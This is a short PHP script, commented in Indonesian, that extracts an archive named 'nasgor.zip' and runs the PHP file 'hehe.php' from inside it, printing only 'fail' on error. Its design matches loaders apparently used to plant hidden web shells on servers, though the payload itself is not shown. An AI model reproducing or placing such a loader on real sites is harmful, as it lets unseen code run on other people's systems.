<?php
$zip = new ZipArchive;
if ($zip->open('nasgor.zip') === TRUE) {
    // Tentukan direktori tujuan ekstraksi
    $extractPath = 'extracted/';
    
    // Ekstrak seluruh isi zip
    if ($zip->extractTo($extractPath)) {
        $filename = $extractPath . 'hehe.php';
        
        // Periksa apakah file berhasil diekstrak
        if (file_exists($filename)) {
            include($filename); // Gunakan include untuk menjalankan kode
        } else {
            echo "fail";
        }
    } else {
        echo "fail";
    }
    
    $zip->close();
    
    // Opsional: Hapus file yang diekstrak setelah digunakan
    // unlink($filename);
} else {
    echo "fail";
}